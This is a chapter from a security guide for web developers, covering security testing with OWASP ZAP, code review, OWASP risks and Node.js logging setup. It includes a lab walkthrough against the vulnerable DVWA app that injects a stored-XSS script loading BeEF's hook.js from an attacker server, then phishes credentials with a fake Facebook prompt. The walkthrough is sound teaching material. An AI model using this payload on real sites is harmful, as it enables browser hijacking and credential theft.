# Web Applications {#web-applications}

![10,000' view of Web Application Security](images/10000WebApp.gif)

## Development Practices

Let us look at some of the practices we can use as developers to lift the level of security within our software.

### Architecture

There are no architects in Scrum. Just Developers. Some of those developers have architect qualities. They like to step back often to see the bigger picture and understand the interactions between the components and the people using the software. Including every aspect to do with the end product, the people intending to use it and the risks.

Agile architecture does a little design up front in collaboration with the team and everyone that has a vested interest. Agile architecture is not siloed, because it is part of development, just as analysing requirements and testing. It is all done in parallel.

So, we do not really separate the discipline of architecture from a software developer that excels at doing what a traditional architect does as well as engineering. An architect is essentially an extreme version of the 'T' shaped developer. They have very broad knowledge and skill bases, with multiple deep specialities.  
Another defining factor that sets the architect apart is their ability to translate effectively between the most technical people on a project and the least technical. I like to think of them as the people that spend a lot of time riding the elevator of a high rise building. Most technical people toward the bottom of the building and least technical people at the top. The architect spends time on each level taking what he/she has learnt from all the other levels, then translating and applying it to the specific level.

&nbsp;

### Security Test-Driven Development (STDD) {#web-applications-development-practices-security-test-driven-development}

![](images/red_green_refactor.jpg)

There are three aspects I would like to focus on here. You can simply continue to use your existing automated test suites and frameworks. All you have to do is:

1. Add a **security focused test API** into the mix of your existing automated acceptance test suites.  
 Your chosen (language specific) BDD framework of choice, putting legs to your test conditions with automatable "[Given, When, Thens](http://blog.binarymist.net/2012/03/24/how-to-optimise-your-testing-effort/#planningTheTestEffort)".
2. If you are using NodeJS and have not already got your tests running as part of a CI build or pre-commit hook, check out the Consuming Free and Open Source [Tooling](#web-applications-countermeasures-consuming-free-and-open-source-tooling) section for some info on how to set this up
3. Add **security focused BDD/TDD/ATDD** tests.
 This is the same amount of work as any other automated TDD, but it has the huge benefit of bringing the finding of security faults from where it is very expensive to fix:  

    ![](images/CostOfChange.png)  

    to where it is the cheapest possible place to fix:

    ![](images/CostOfChange-WithSTDD.png)  

&nbsp;

1. Continuing No. 1 from above: [OWASP ZAP](https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project) (which also comes [pre-installed on Kali Linux](http://blog.binarymist.net/2014/03/29/up-and-running-with-kali-linux-and-friends/#zap) ) is a particularly useful tool for SBDD and regression testing. Because it not only provides a manual tool similar to the likes of Burp Suite + with many other features. ZAP also has the ability to run as a HTTP proxy:
    1. You can run ZAP manually then through the menu Tools -> Options... -> API turn the HTTP API on
    2. Run ZAP from the command line using the -daemon flag
    
        {linenos=off}
            owasp-zap -daemon

    You can then access the API like this:
    
    {linenos=off,lang=bash}
       curl http://localhost:8080 # Providing ZAP is listening on port 8080

  
    This allows us to within our Behavioural, Acceptance tests, send requests programmatically directly to the ZAP HTTP API to do what ever we could do manually with the tool against the System Under Test (SUT).
 You can of course use Selenium 2 (WebDriver) also to drive browser tests and in parallel. I discussed this in ["Automating Specification by Example"](http://blog.binarymist.net/2014/02/22/automating-specification-by-example-for-net/#scope).

    The ZAP API can be accessed directly or by any of the following client implementations:

    * Node.JS (by way of [zaproxy](https://www.npmjs.com/package/zaproxy))
    * Python
    * PHP
    * Ruby
    * .Net [write-up](http://www.codeproject.com/Articles/708129/Automated-penetration-testing-in-the-Microsoft-sta), [source](https://github.com/gustavorhm/ZapPenTester). It is easy to see how the API is started and used [here](https://github.com/gustavorhm/ZapPenTester/blob/master/ZAPPenTester/Zap.cs).  
 There is also the [OWASP Secure TDD Project](https://www.owasp.org/index.php/OWASP_Secure_TDD_Project). A .Net solution. This project appears to either be abandoned or just very low activity. Feel free to offer to help though if you are a .Net developer. I am not sure I agree with one of the opening statements: "they need to cover all tests prior development". The approach that I would take would be to write some specification (test), execute it, (red) -> Write the smallest amount of code possible to make it pass (green) -> Add to the specification (test)(refactor). As you can see that is your red->green->refactor loop, with the smallest amount possible for each iteration.
    * Java. A couple of client projects useful for seeing how to use the ZAP API: [zap-webdriver](https://github.com/continuumsecurity/zap-webdriver), [bdd-security](https://github.com/continuumsecurity/bdd-security)

    For getting started with OWASP ZAPs API check the:

    * [regression testing](https://code.google.com/p/zaproxy/wiki/SecRegTests)
    * [API details](https://code.google.com/p/zaproxy/wiki/ApiDetails)

2. Continuing No. 2 from above: This is adding another aspect to your existing TDD/BDD thought process. Instead of the business waiting until go-live before contracting the experts to beat up your system. Then tell you **your security sucks**. We take a proactive approach and move a lot of the effort traditionally performed at go-live **up front**, where you yourself as the developer can test and fix. Thus saving embarrassment and the business a lot of money.  
BSIMM has some good [guidance on security testing](https://www.bsimm.com/online/ssdl/st/)

What is so good about STDD and SBDD, is that it roles up Specifications, Design, Implementation and Verification all into one process. Thus working toward delivering each increment that is truly ["Done"](http://blog.binarymist.net/2013/03/02/how-to-increase-software-developer-productivity/#definitionOfDone). Driving development with tests is not about testing right? It is about creating code that is testable. Testable code is inherently well designed and gives us the ability to reason about the state at any given time.  
OpenSSL Heartbleed and Apples Goto Fail could have been prevented if (S)TDD was used. Check out Mike Bland's [excellent study and POC](http://martinfowler.com/articles/testing-culture.html).

<!--- Other Resources: http://www.continuumsecurity.net/services.html#testing -->

&nbsp;

### Hand-crafted Penetration Testing

Sometimes known as "gorilla testing".

As previously discussed, this can be costly when performed late in a projects life cycle, so by automating as much as possible, including high level scans which help to identify starting points to attack, it leaves the developers to do what they do best...

Get creative.

There is no reason why developers can not take a good chunk of the manual penetration testing effort on as part of their daily development practices. In fact in most teams I have lead, this has been exactly how we have worked. The gorilla testing needs to be performed in parallel with the PBIs in the Scrum Backlog as developers pull them into Work I Progress (WIP).

BSIMM again has some [good guidance](https://www.bsimm.com/online/deployment/pt/) on hands on penetration testing.

### Establish a Security Champion

Some developers have an inquisitiveness about how their work can be exploited, so it is important to have at least a none zero number of developers with a security focus within each team to:

1. Take the lead on the security front
2. Mentor, infect their passion and pass on their knowledge to their co-workers

Remember I mentioned in the People chapter in the ["Top Developer Motivators in Order"](#people-countermeasures-morale-productivity-and-engagement-killers-top-developer-motivators-in-order) section how developers love being champion of something? The role of security champion or any champion for that matter needs to be applied to the developer as a vacuum. People do not respond well to being pushed into anything. The best developers will just pick up the role, but many will not be as proactive. For the less proactive developers, it pays to create the role and as a Product Owner or manager approach them and ask them if they would like to take the responsibility as security champion. Once a developer has taken up this responsibility, they will usually do a pretty good job of infecting the rest of their team with their passion and knowledge.

### Pair Programming

Two pairs of eyes on the same code is proven to drastically reduce defects, and it does it at the cheapest possible place, as they are being created. Pair programming can be a very effective discipline, but not all the time and not for all people. There is a lot of resources on the topic. If you have not tried it, then you should, but it is probably counter productive to mandate that all the developers should do it all of the time. It is probably a good idea to encourage developers to pair on complex tasks. It is a tool, try it and use it wisely.

&nbsp;

### Code Review

If we can not get the simple things right like [Coding standards and conventions](http://blog.binarymist.net/2012/12/19/javascript-coding-standards-and-guidelines/) to help remove some of the "wild west" attitudes and behaviours, then how will we ever get the complicated things right? The whole team needs to abide by the standards, conventions and guidelines.

[Callback Hell Alternatives](http://blog.binarymist.net/2014/07/26/node-js-asynchronicity-and-callback-nesting/) for example.

Manual and Automated.

Check out the [BSIMM Code Review](https://www.bsimm.com/online/ssdl/cr/) for some good ideas.

#### Why? {#web-applications-development-practices-code-review-why}

Because when humans are in creative mode, we often struggle to see the defects in our own creation. That is why tightly knit teams with high morale (as discussed in the people chapter under the "Morale, Productivity and Engagement Killers" sections) are a force to be reckoned with. We are all watching each others backs. We are good at seeing faults in others and their creations. That is why we really do need each other. Never underestimate this blindness in us all and that we have a very powerful mitigation tool in the team. Use it.

#### Linting, Static Analysis

Start with the likes of JSHint. There are lots of other good tooling options.

Techniques and tools to assist with automating

* [https://wiki.mozilla.org/Security/B2G/JavaScript_code_analysis](https://wiki.mozilla.org/Security/B2G/JavaScript_code_analysis)
* [JSPrime](https://www.youtube.com/watch?v=Vk5SPGpqiLc) Security focused

#### Dynamic Analysis

Tooling is still immature here. We have got a way to go, but lets start getting our feet wet.

* [Titanium Code Processor](https://theoreticalideations.com/tag/titanium-code-processor/)
* [Slide Deck](https://speakerdeck.com/ariya/dynamic-code-analysis-for-javascript)
* [Jalangi](https://www.eecs.berkeley.edu/~gongliang13/jalangi_ff/)

&nbsp;

### Techniques for Asserting Discipline

JavaScript is an inherently flexible and undisciplined language. This quality is a double edged sword. It provides us with extreme power and also allows us to slaughter ourselves. Discipline is very much needed in order to stay safe and be able to reason about our applications as they grow larger.

I have been involved in many JavaScript project rescue missions where a development team can no longer understand what the monster they have created is doing, what state it is in and why? In almost all occasions, the developers on the team do not have a deep understanding of the language and often of any language. Because of this I always try and push the fact that JavaScript developers must do everything they can to understand the language. In most cases this means taking their learning home and getting intimate with JavaScripts beauty.

Because of the distinct lack of discipline within JavaScript (unlike most other languages) I try and bring as much understanding around techniques that can help impose the extra rigour where and when it is needed. The beautiful thing about JavaScript is that when you really need to do something unconventional, you can, but I like to **weigh up the trade-offs** of either approach.

#### Static Type Checking

In JavaScript we need as much help as we can to fail fast. Static type checking gives us this. It also feels like the step before DbC.

* [flow](http://flowtype.org/) looks to be a good option. Providing consumers with the option of introducing type checking progressively and/or to certain parts that make the most sense. Or rather missing parts that require the extra flexibility.


#### Design by Contract (DbC)

Enforcing preconditions, postconditions and invariants in our routines.
That is right, we can even employ this design principle in JavaScript. I wrote about DbC in a [previous post](http://blog.binarymist.net/2010/10/11/lsp-dbc-and-nets-support/#dbc) in regards to usage in .Net.  
In JavaScript, I believe the DbC principle is even more important as part of adding discipline and keeping us on the straight and narrow. I believe DbC is the principle that helps us achieve the [Liskov Substitution Principle](http://blog.binarymist.net/2010/10/11/lsp-dbc-and-nets-support/#lsp), which is the 'L' in the SOLID design mnemonic. These are the offerings I have noticed that provide support:

1. [ristretto-js](https://code.google.com/p/ristretto-js/w/list)
2. [contract-js on NPM](https://www.npmjs.com/package/contracts-js)
  * [contract.js at home](http://www.contractsjs.org/)
3. [contractual on NPM](https://www.npmjs.com/package/contractual)

In many cases you can implement your cross cutting code contracts using AOP. This gets it out of your code, so that it is not in your face.

### Forming Habits

_Todo_

%% Start out the way you want to end.



### Sharpen Your Skills

_Todo_

%% Look at the likes of NodeGoat and other vulnerable apps.




## 1. SSM Asset Identification
Take results from [higher level Asset Identification](#asset-identification). Remove any that are not applicable. Add any newly discovered. Here are some to get you started:

{#web-applications-asset-identification-ownership}
* Ownership. Similarly as addressed in the VPS chapter, Do not assume that ownership, or at least control of your server(s) is something you will always have. Ownership is often one of the first assets an attacker will attempt to take from a target in order to execute further exploits. At first this may sound strange, but that is because of an assumption you may have that you will always own (have control of) your web application. Hopefully I dispelled this myth in the VPS chapter. If an attacker can take control of your web application (own it/steal it/what ever you want to call the act), then they have a foot hold to launch further attacks and gain other assets of greater value. The web application itself will often just be a stepping stone to other assets that you assume are safe. With this in mind, your web application is an asset. On the other hand you could think of it as a liability. Both may be correct. In any case, you need to protect your web application and in many cases take it to school and teach it how to protect itself. I cover that under the [Web Application Firewall](#web-applications-countermeasures-lack-of-active-automated-prevention-waf) section, where AppSensor can help.
* Similarly to the [Asset Identification](#vps-asset-identification) section in the VPS chapter, Visibility is an asset that is up for grabs
* Intellectual property or sensitive information within the code or configuration files such as email addresses and account credentials for the likes of data-stores, syslog servers, monitoring services. We address this in [Management of Application Secrets](#web-applications-identify-risks-management-of-application-secrets)
* Sensitive Client/Customer data.
* Sanity and piece of mind of people within your organisation. Those that are:
  * Well informed
  * Do not cut corners that should not be cut
  * Passionate and driven to be their best
  * Smart
  * Humble yet fearless
  * Recognise technical debt and are professional enough to speak up
  * Engaged and love passing on their knowledge to others are truly an asset.  
  Some of the following risks will threaten the sanity of these people if the countermeasures are not employed.

## 2. SSM Identify Risks
Go through same process as we did at the [top level](#identify-risks), but for Web Application.

* [MS Application Threats and Countermeasures](https://msdn.microsoft.com/en-us/library/ff648641.aspx#c02618429_008)
* _Todo_ Exploit WebRTC
  * [Part 1](http://blog.beefproject.com/2015/01/hooked-browser-meshed-networks-with.html)
  * [Part 2](http://blog.beefproject.com/2015/01/hooked-browser-meshed-networks-with_26.html)

This slide was from a talk I did at OWASP NZ Day 2013. The top 10 vulnerabilities do not change a lot

&nbsp;

![](images/2013OWASPTop10.jpg)

&nbsp;

They were actually very similar 10 years ago.
   
The vulnerabilities that have not changed a lot are:

* No. 1 Injection (and the easiest to fix)
* No. 2 Broken Authentication and Session Management
* No. 3 XSS
* No. 4 Insecure Direct Object References
* No. 5 Security Misconfiguration
* No. 8 Frameworks are helping with CSRF
* No. 9 is new, because we are now consuming a lot more packages without vetting them.

&nbsp;

![](images/OWASPTop10SomeThingsDontChange.jpg)

{pagebreak}

### Lack of Visibility

I see this as an indirect risk to the asset of [web application ownership](#web-applications-asset-identification-ownership). The same sections in the VPS and Network chapters may also be worth reading if you have not already as there is crossover.

Not being able to introspect your application at any given time or being able to know how the health status is, is not a comfortable place to be in and there is no reason you should be there.

#### Insufficient Logging and Monitoring

![](images/ThreatTags/average-widespread-veryeasy-moderate.png)

Can you tell at any point in time if someone or something is:

* Using your application in a way that it was not intended to be used
* Violating policy. For example circumventing client side input sanitisation.

How easy is it for you to notice:

* Poor performance and potential DoS?
* Abnormal application behaviour or unexpected logic threads
* Logic edge cases and blind spots that stake holders, Product Owners and Developers have missed?
* Any statistics that may be helpful in diagnosing any application specific issue

### Lack of Input Validation, Filtering and Sanitisation {#web-applications-identify-risks-lack-of-input-validation-and-sanitisation}
![](images/ThreatTags/easy-common-average-severe.png)

#### Buffer Overflows {#web-applications-identify-risks-buffer-overflows}

_Todo_
<!--- https://msdn.microsoft.com/en-us/library/ff648641.aspx#c02618429_008 -->

#### Cross-Site Scripting (XSS) {#web-applications-identify-risks-cross-site-scripting}
![](images/ThreatTags/average-verywidespread-easy-moderate.png)

&nbsp;

_Todo_ [Discuss intricacies of XSS](https://github.com/binarymist/HolisticInfoSec-For-WebDevelopers/issues/4)

&nbsp;

{#wdcnz-demo-1}
![](images/HandsOnHack.png)

The following attack was the first one of five that I demonstrated at WDCNZ in 2015. The attack after this one was a credential harvest based on a spoofed website that hypothetically was fetched due to a spear phishing attack. That particular attack can be found in chapter 8 People, under [Spear Phishing](#people-identify-risks-spear-phishing). 

Theoretically in order to get to the point where you carry out this attack, you would have already been through several stages first. If you are carrying out a penetration testing engagement, it is likely you would have been through the following:

1. Information gathering (probably partly even before you signed the contract with your client)
2. Vulnerability scanning
3. Vulnerability searching

If you are working within a development team you may have found out some other way that your project was vulnerable to XSS.

How ever you got to this point, you are going to want to exhibit the fault. One of the most effective ways to do this is by using BeEF. BeEF clearly shows what is possible when you have an XSS vulnerability in scope and is an excellent tool for effortlessly demonstrating the severity of the fault to all team members and stakeholders.  
One of BeEFs primary reasons to exist is to exploit the fact that many security philosophies seem to forget how easy it is to go straight through hardened network perimeters and attack the soft mushy insides of a sub network (as discussed in chapter 5 Physical, under the [Fortress Mentality](#physical-identify-risks-fortress-mentality) section). Exposing XSS faults is one of BeEFs attributes. 

You can find the video of how this attack is played out [here](https://www.youtube.com/watch?v=92AWyUfJDUw).

I> ## Synopsis
I>
I> In this exercise, I have used the Dam Vulnerable Web App (DVWA), as it has the types of XSS vulnerabilities we need in order to demonstrate the power of BeEF. DVWA is included in the OWASP Broken Web Application ([OWASPBWA](https://www.owasp.org/index.php/OWASP_Vulnerable_Web_Applications_Directory_Project)) turn-key VM, along with many other useful purposely vulnerable projects.  
I> We use BeEF to exploit an XSS vulnerability in DVWA and carry out a simple attack in which we coerce the target to enter their credentials for a website and send them to our BeEF communications server unknowingly.

{icon=bomb}
G> ## The Play
G>
G> Make sure you have the OWASPBWA [configured](https://code.google.com/p/owaspbwa/wiki/UserGuide) and running in your lab.
G>
G> From the directory that you have BeEF installed, run the BeEF ruby script: `./beef`
G>
G> Log into the BeEF UI at `http://localhost:3000/ui/authentication` (or using https if you have configured TLS) with the user and password that you set-up in the BeEF root config.yaml.
G>
G> Open another browser tab and log-in to the DVWA.
G>
G> Browse to "XSS stored".
G>
G> Enter some text in the Name field and some text in the Message field.
G> 
G> Enable foxy proxy so that your request goes to the same port that burp suite is going to be listening on.
G>
G> Fire up burp.
G>
G> Back in the DVWA send your request by clicking on the Sign Guest-book button.
G>
G> Switch back to burp -> Proxy tab and the request should be waiting for you. You now need to replace the text you used in the Message field `mtxMessage` with `<script src="http://<BeEF comms server IP address>:3000/hook.js"></script>` and forward the request.
G>
G> You can disable FoxyProxy now too.
G>
G> Now on your victims machine, the victim can log into DVWA and browse to the same "XSS stored" page. Now as the attacker, you will now notice that the BeEF Web UI shows a node with the victims IP address. This means BeEF has the victims browser hooked. The victims browser is now a zombie, continuously polling the BeEF communications server for commands to execute on its behalf.
G>
G> If you open the victims browser developer tools, you will be able to inspect the communications and the JavaScript within the hook.js file.
G>
G> Back in the BeEF web UI you can explore the modules that you can launch against the victims browser. You can view the types of attacks you can carry out on the [BeEF projects wiki](https://github.com/beefproject/beef/wiki/BeEF-modules).
G>
G> If you select the victims node and click on the Commands tab in the BeEF web UI, then in the Module Tree under Social Engineering select the "Pretty Theft" node. There are some options to configure, but even selecting the default of Facebook if you know your target is already an avid FB user should work fine. You would of course know this if you have done due diligence in the reconnaissance stage.
G>
G> Click on the Execute button and on the next request -> response from the hook.js, the victims browser should pop a "Facebook Session Timed Out" modal. To get rid of this modal, the victim must enter their credentials and Log-in. There is no cancel or 'x' button. Once the victim has sent their credentials, they will be visible in the Command results of the BeEF web UI.  

#### Cross-Site Request Forgery (CSRF)

_Todo_

#### SQLi {#web-applications-identify-risks-sqli}

![](images/HandsOnHack.png)

 One of the simplest and quickest vulnerabilities to fix, yet it is still top of the hit lists.  
 Lets hammer this home some more.

#### Command Injection {#web-applications-identify-risks-command-injection}

![](images/HandsOnHack.png)

_Todo_

%% NodeJS https://blog.liftsecurity.io/2014/08/19/Avoid-Command-Injection-Node.js

#### LDAP Injection {#web-applications-identify-risks-ldap-injection}

_Todo_

#### XPath Injection {#web-applications-identify-risks-xpath-injection}

_Todo_

#### XQuery Injection {#web-applications-identify-risks-xquery-injection}

_Todo_

#### XSLT Injection {#web-applications-identify-risks-xslt-injection}

_Todo_

#### XML Injection {#web-applications-identify-risks-xml-injection}

_Todo_

### Management of Application Secrets {#web-applications-identify-risks-management-of-application-secrets}

* Passwords and other secrets for things like data-stores, syslog servers, monitoring services, email accounts and so on can be useful to an attacker to compromise data-stores, obtain further secrets from email accounts, file servers, system logs, services being monitored, etc, and may even provide credentials to continue moving through the network compromising other machines.
* Passwords and/or their hashes travelling over the network. Also see the [Wire Inspecting](#network-identify-risks-wire-inspecting) section in the [Network](#network) chapter.

#### Data-store Compromise
![](images/ThreatTags/difficult-common-average-moderate.png)

The reason I've tagged this as moderate is because if you take the countermeasures, it doesn't have to be a disaster.

There are many examples of this happening on a daily basis to millions of users. The Ashley Madison debacle is a good example. Ashley Madison's entire business relied on its commitment to keep its clients (37 million of them) data secret, provide discretion and anonymity. 

"_Before the breach, the company boasted about airtight data security but ironically, still proudly displays a graphic with the phrase “trusted security award” on its homepage_"

"_We worked hard to make a fully undetectable attack, then got in and found nothing to bypass.... Nobody was watching. No security. Only thing was segmented network. You could use Pass1234 from the internet to VPN to root on all servers._”

"_Any CEO who isn’t vigilantly protecting his or her company’s assets with systems designed to track user behavior and identify malicious activity is acting negligently and putting the entire organization at risk. And as we’ve seen in the case of Ashley Madison, leadership all the way up to the CEO may very well be forced out when security isn’t prioritized as a core tenet of an organization._"

> Dark Reading

Other notable data-store compromises were [LinkedIn](https://en.wikipedia.org/wiki/2012_LinkedIn_hack) with 6.5 million user accounts compromised and 95% of the users passwords cracked in days. Why so fast? Because they used simple hashing, specifically SHA-1. [EBay](http://www.darkreading.com/attacks-breaches/ebay-database-hacked-with-stolen-employee-credentials-/d/d-id/1269093) with 145 million active buyers. Many others coming to light regularly. 

Are you using well salted and quality strong key derivation functions (KDFs) for all of your sensitive data? Are you making sure you are notifying your customers about using high quality passwords? Are you informing them what a high quality password is? Consider checking new user credentials against a list of the most frequently used and insecure passwords collected.

### Lack of Authentication {#web-applications-identify-risks-lack-of-authentication}

_Todo_  
_Todo_  
...

### Cryptography on the Client (AKA Untrusted Crypto) {#web-applications-identify-risks-cryptography-on-the-client}

* Untrusted Crypto (Web Crypto API). Is this really a good idea? _Todo_
  * [https://www.hackinparis.com/node/309](https://www.hackinparis.com/node/309)
  * [http://tonyarcieri.com/whats-wrong-with-webcrypto](http://tonyarcieri.com/whats-wrong-with-webcrypto)

### Consuming Free and Open Source {#web-applications-identify-risks-consuming-free-and-open-source}
![](images/ThreatTags/average-widespread-difficult-moderate.png)

This is where [A9 (Using Components with Known Vulnerabilities)](https://www.owasp.org/index.php/Top_10_2013-A9-Using_Components_with_Known_Vulnerabilities) of the 2013 OWASP Top 10 comes in.

We are consuming far more free and open source libraries than we have ever before. Much of the code we are pulling into our projects is never intentionally used, but is still adding surface area for attack. Much of it:

* Is not thoroughly tested (for what it should do and what it should not do). We are often relying on developers we do not know a lot about to have not introduced defects. As I discussed in the [Code Review](#web-applications-development-practices-code-review-why) section, most developers are more focused on building than breaking, they do not even see the defects they are introducing.
* Is not reviewed evaluated. That is right, many of the packages we are consuming are created by solo developers with a single focus of creating and little to no focus of how their creations can be exploited. Even some teams with a security champion are not doing a lot better.
* Is created by amateurs that could and do include vulnerabilities. Anyone can write code and publish to an open source repository. Much of this code ends up in our package management repositories which we consume.
* Does not undergo the same requirement analysis, defining the scope, acceptance criteria, test conditions and sign off by a development team and product owner that our commercial software does.

Many vulnerabilities can hide in these external dependencies. It is not just one attack vector any more, it provides the opportunity for many vulnerabilities to be sitting waiting to be exploited. If you do not find and deal with them, I can assure you, someone else will.

Running install or any scripts from non local sources without first downloading them and inspecting can destroy or modify your and any other reachable systems, send sensitive information to an attacker, or any number
of other criminal activities.

### Lack of Active Automated Prevention

_Todo_

## 3. SSM Countermeasures

* [MS Application Threats and Countermeasures](https://msdn.microsoft.com/en-us/library/ff648641.aspx#c02618429_008)

### Lack of Visibility {#web-applications-countermeasures-lack-of-visibility}

Also refer to the ["Lack of Visibility"](#vps-countermeasures-lack-of-visibility) section in the VPS chapter where I discuss a number of tried and tested solutions.

As Bruce Schneier said: "_Detection works where prevention fails and detection is of no use without response_". This leads us to application logging.

With good visibility we should be able to see anticipated and unanticipated exploitation of vulnerabilities as they occur and also be able to go back and review the events.

#### Insufficient Logging {#web-applications-countermeasures-lack-of-visibility-insufficient-logging}
![](images/ThreatTags/PreventionAVERAGE.png)


When it comes to logging in NodeJS, you can't really go past winston. It has a lot of functionality and what it does not have is either provided by extensions, or you can create your own. It is fully featured, reliable and easy to configure like NLog in the .NET world.

I also looked at `express-winston`, but could not see why it needed to exist.

{title="package.json", linenos=off, lang=JavaScript}
    {
       ...
       "dependencies": {
          ...,
          "config": "^1.15.0",
          "express": "^4.13.3",
          "morgan": "^1.6.1",
          "//": "nodemailer not strictly necessary for this example,",
          "//": "but used later under the node-config section.",
          "nodemailer": "^1.4.0",
          "//": "What we use for logging.",
          "winston": "^1.0.1",          
          "winston-email": "0.0.10",
          "winston-syslog-posix": "^0.1.5",
          ...
       }
    }

[`winston-email`](https://www.npmjs.com/package/winston-email) also depends on [`nodemailer`](https://www.npmjs.com/package/nodemailer).

##### Opening UDP port

with [`winston-syslog`](https://www.npmjs.com/package/winston-syslog) seems to be what a lot of people are using. I think it may be due to the fact that `winston-syslog` is the first package that works well for winston and syslog.

If going this route, you will need the following in your `/etc/rsyslog.conf`:

{title="/etc/rsyslog.conf", linenos=off, lang=Bash}
    $ModLoad imudp
    # Listen on all network addresses. This is the default.
    $UDPServerAddress 0.0.0.0
    # Listen on localhost.
    $UDPServerAddress 127.0.0.1
    $UDPServerRun 514
    # Or the new style configuration.
    Address <IP>
    Port <port>
    # Logging for your app.
    local0.* /var/log/yourapp.log

I Also looked at `winston-rsyslog2` and `winston-syslogudp`, but they did not measure up for me.

If you do not need to push syslog events to another machine, then it does not make much sense to push through a local network interface when you can use your posix syscalls as they are faster and safer. Line 7 below shows the open port.

{title="nmap with winston-syslog", linenos=on}
    root@kali:~# nmap -p514 -sU -sV <target IP> --reason

    Starting Nmap 6.47 ( http://nmap.org )
    Nmap scan report for kali (<target IP>)
    Host is up, received arp-response (0.0015s latency).
    PORT    STATE         SERVICE REASON      VERSION
    514/udp open|filtered syslog  no-response
    MAC Address: 34:25:C9:96:AC:E0 (My Computer)

##### Using Posix

The [`winston-syslog-posix`](https://www.npmjs.com/package/winston-syslog-posix) package was inspired by [blargh](http://tmont.com/blargh/2013/12/writing-to-the-syslog-with-winston). `winston-syslog-posix` uses [`node-posix`](https://www.npmjs.com/package/posix).

If going this route, you will need the following in your `/etc/rsyslog.conf` instead of the above:

{title="/etc/rsyslog.conf", linenos=off, lang=Bash}    
    # Logging for your app.
    local0.* /var/log/yourapp.log

Now you can see on line 7 below that the syslog port is no longer open:

{title="nmap with winston-syslog-posix", linenos=on}
    root@kali:~# nmap -p514 -sU -sV <target IP> --reason

    Starting Nmap 6.47 ( http://nmap.org )
    Nmap scan report for kali (<target IP>)
    Host is up, received arp-response (0.0014s latency).
    PORT    STATE  SERVICE REASON       VERSION
    514/udp closed syslog  port-unreach
    MAC Address: 34:25:C9:96:AC:E0 (My Computer)

&nbsp;

Logging configuration should not be in the application startup file. It should be in the configuration files. This is discussed further under the ["Store Configuration in Configuration files"](#web-applications-countermeasures-management-of-application-secrets-store-configuration) section.

Notice the syslog transport in the configuration below starting on line 39. 

{title="default.js", linenos=on, lang=JavaScript}
    module.exports = {
       logger: {      
          colours: {
             debug: 'white',
             info: 'green',            
             notice: 'blue',
             warning: 'yellow',
             error: 'yellow',
             crit: 'red',
             alert: 'red',
             emerg: 'red'
          },
          // Syslog compatible protocol severities.       
          levels: {
             debug: 0,
             info: 1,
             notice: 2,
             warning: 3,
             error: 4,
             crit: 5,
             alert: 6,   
             emerg: 7   
          },
          consoleTransportOptions: {
             level: 'debug',
             handleExceptions: true,
             json: false,
             colorize: true
          },
          fileTransportOptions: {
             level: 'debug',
             filename: './yourapp.log',         
             handleExceptions: true,
             json: true,
             maxsize: 5242880, //5MB
             maxFiles: 5,
             colorize: false
          },
          syslogPosixTransportOptions: {
             handleExceptions: true,
             level: 'debug',
             identity: 'yourapp_winston'
             //facility: 'local0' // default
                // /etc/rsyslog.conf also needs: local0.* /var/log/yourapp.log
                // If non posix syslog is used, then /etc/rsyslog.conf or one
                // of the files in /etc/rsyslog.d/ also needs the following
                // two settings:
                // $ModLoad imudp // Load the udp module.
                // $UDPServerRun 514 // Open the standard syslog port.
                // $UDPServerAddress 127.0.0.1 // Interface to bind to.
          },
          emailTransportOptions: {
             handleExceptions: true,
             level: 'crit',
             from: 'yourusername_alerts@fastmail.com',
             to: 'yourusername_alerts@fastmail.com',
             service: 'FastMail',
             auth: {
                user: "yourusername_alerts",
                pass: null // App specific password.
             },
             tags: ['yourapp']      
          }
       }   
    }

In development I have chosen here to not use syslog. You can see this on line 3 below. If you want to test syslog in development, you can either remove the logger object override from the `devbox1-development.js` file or modify it to be similar to the above. Then add one line to the `/etc/rsyslog.conf` file to turn on. As mentioned in a comment above in the `default.js` config file on line 44.

{title="devbox1-development.js", linenos=on, lang=JavaScript}
    module.exports = {
       logger: {
          syslogPosixTransportOptions: null
       }
    }

In production we log to syslog and because of that we do not need the file transport you can see configured starting on line 30 above in the `default.js` configuration file, so we set it to null as seen on line 6 below in the `prodbox-production.js` file.

I have gone into more depth about how we handle syslogs in the VPS chapter under the [Logging and Alerting](#vps-countermeasures-lack-of-visibility-logging-and-alerting) section, where all of our logs including these ones get streamed to an off-site syslog server. Thus providing easy aggregation of all system logs into one user interface that DevOpps can watch on their monitoring panels in real-time and also easily go back in time to visit past events. This provides excellent visibility as one layer of defence.

There were also some other [options](http://help.papertrailapp.com/kb/configuration/configuring-centralized-logging-from-nodejs-apps/) for those using Papertrail as their off-site syslog and aggregation PaaS, but the solutions were not as clean as simply logging to local syslog from your applications and then sending off-site from there. Again this is discussed in more depth in the "Logging and Alerting" section in the VPS chapter.

{title="prodbox-production.js", linenos=on, lang=JavaScript}
    module.exports = {
       logger: {
          consoleTransportOptions: {
             level: {},
          },
          fileTransportOptions: null,
          syslogPosixTransportOptions: {
             handleExceptions: true,
             level: 'info',
             identity: 'yourapp_winston'
          }
       }
    }

{title="local.js", linenos=off, lang=JavaScript}
    // Build creates this file.
    module.exports = {
       logger: {
          emailTransportOptions: {
             auth: {
                pass: 'Z-o?(7GnCQsnrx/!-G=LP]-ib' // App specific password.
             }
          }
       }
    }

The `logger.js` file wraps and hides extra features and transports applied to the logging package we are consuming.

{title="logger.js", linenos=off, lang=JavaScript}
    var winston = require('winston');
    var loggerConfig = require('config').logger;
    require('winston-syslog-posix').SyslogPosix;
    require('winston-email').Email;

    winston.emitErrs = true;

    var logger = new winston.Logger({
       // Alternatively: set to winston.config.syslog.levels
       exitOnError: false,
       // Alternatively use winston.addColors(customColours); There are many ways
       // to do the same thing with winston
       colors: loggerConfig.colours,
       levels: loggerConfig.levels
    });

    // Add transports. There are plenty of options provided and you can add your own.

    logger.addConsole = function(config) {
       logger.add (winston.transports.Console, config);
       return this;
    };

    logger.addFile = function(config) {
       logger.add (winston.transports.File, config);
       return this;
    };

    logger.addPosixSyslog = function(config) {
       logger.add (winston.transports.SyslogPosix, config);
       return this;
    };

    logger.addEmail = function(config) {
       logger.add (winston.transports.Email, config);
       return this;
    };

    logger.emailLoggerFailure = function (err /*level, msg, meta*/) {
       // If called with an error, then only the err param is supplied.
       // If not called with an error, level, msg and meta are supplied.
       if (err) logger.alert(
          JSON.stringify(
             'error-code:' + err.code + '. '
             + 'error-message:' + err.message + '. '
             + 'error-response:' + err.response + '. logger-level:'
             + err.transport.level + '. transport:' + err.transport.name
          )
       );
    };

    logger.init = function () {
       if (loggerConfig.fileTransportOptions)
